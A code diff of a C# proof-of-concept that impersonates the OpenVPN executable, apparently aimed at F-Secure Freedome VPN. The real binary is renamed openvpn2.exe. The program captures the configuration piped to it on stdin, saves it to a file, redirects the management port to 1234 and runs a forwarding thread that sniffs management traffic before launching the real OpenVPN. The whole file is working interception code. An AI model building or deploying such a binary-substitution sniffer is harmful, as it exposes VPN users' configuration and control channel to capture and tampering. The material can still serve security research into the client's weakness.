@@ -40,86 +40,71 @@ namespace openvpn
 {
 	class MainClass
 	{
-		
-		
-	
-		
 		public static void Main (string[] args)
 		{
 			// OpenVPN Stdin & management port "sniffer"
-            // PoC for Grab F-Secure Freedome VPN information
-			string fileInName = "_PoC_ConfigFile.txt";
+    			string fileInName = "_PoC_ConfigFile.txt";
 			System.IO.StreamWriter fileIn = new System.IO.StreamWriter(fileInName);
 			int port = 0;
 			
 			string s;
-            while ((s = Console.ReadLine()) != null) // null = EOL
-            {
-				// remplacement du port du mgmt
-                if (s.StartsWith("management 127.0.0.1"))
-                {
-                  
-                    //modifie le port de management
-                    fileIn.WriteLine("management 127.0.0.1 1234");
-                    fileIn.Flush();
-					
-                    // start new tcp wrapper thread
-                    // recup du port de management réel
-                    string[] managementrealport = s.Split(' ');
-                    port = int.Parse(managementrealport[2]);
-
-                }
-                else
-                {
-                   
-                    fileIn.WriteLine(s);
-                    fileIn.Flush();
-                }
-            }
 			
+			// Read stdin 
+            		while ((s = Console.ReadLine()) != null) // null = EOF
+            		{
+				// replace management 
+                		if (s.StartsWith("management 127.0.0.1"))
+                		{
+                  
+                    			//change management port to 1234 (default fixed)
+	                    		fileIn.WriteLine("management 127.0.0.1 1234");
+                    			fileIn.Flush();
+
+                    			// Grab real management port
+                    			string[] managementrealport = s.Split(' ');
+                    			port = int.Parse(managementrealport[2]);
+
+                		}
+                		else
+                		{
+                   			// Write config file
+                		    	fileIn.WriteLine(s);
+                    			fileIn.Flush();
+                		}
+            		} // EOF
+            		// close config file
+			fileIn.Close();
+			// Create Tread for TCP Port Forwading (sniff management message)
 			MyThreadHandle threadHandle = new MyThreadHandle(port);
 			Thread t = new Thread(new ThreadStart(threadHandle.ThreadLoop));
 			t.Start();
 
-			
-			// demarrage de OpenVPN // renommé openvpn.exe en openvpn2.exe
+			// real OpenVPN process
 			ProcessStartInfo processStartInfo;
-            Process process;
+            		Process process;
 
-            // Start real process
-
-            processStartInfo = new ProcessStartInfo();
-            processStartInfo.CreateNoWindow = false;
-            processStartInfo.UseShellExecute = true;
+            		processStartInfo = new ProcessStartInfo();
+            		processStartInfo.CreateNoWindow = false;
+            		processStartInfo.UseShellExecute = true;
 			// paramettre pour openvpn2
-            processStartInfo.Arguments = "--config _PoC_ConfigFile.txt";
-            processStartInfo.FileName = "openvpn2.exe"; 
-
-
-            process = new Process();
-            process.StartInfo = processStartInfo;
-            process.EnableRaisingEvents = true;
-			
+            		processStartInfo.Arguments = "--config _PoC_ConfigFile.txt";
+            		processStartInfo.FileName = "openvpn2.exe"; 
+            		process = new Process();
+            		process.StartInfo = processStartInfo;
+            		process.EnableRaisingEvents = true;
+			// start process			
 			process.Start();
-			
-			
-			// attente
-			
+			// Wait before close
 			while (true){
-			
 				if (process.HasExited == true){
 					t.Abort();				
 					break;
 				}
-				// restart portforwarder
+				// restart portforwarder if stop
 				if (t.IsAlive == false){
 					t.Start();
-					
 				}
-				
 			}
-	
-
 		}
 	}
 }
